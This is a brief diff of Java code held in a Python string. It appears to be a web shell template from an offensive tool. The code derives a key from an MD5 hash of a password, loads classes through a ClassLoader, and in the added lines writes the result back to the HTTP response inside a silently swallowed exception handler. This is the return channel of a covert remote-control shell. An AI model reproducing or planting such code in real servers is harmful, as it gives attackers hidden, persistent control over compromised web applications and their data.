@@ -41,6 +41,9 @@ code = """
                     hasher(password, "MD5").substring(0, 16).getBytes(), true)
                 )+
                 fix.substring(16).toUpperCase();
+            try {
+                invokeMethod(invokeMethod(response, "getWriter"), "write", result);
+            } catch (Exception e) {}
             return result;
         } else {
             lock = this.getClass().getConstructor(ClassLoader.class)
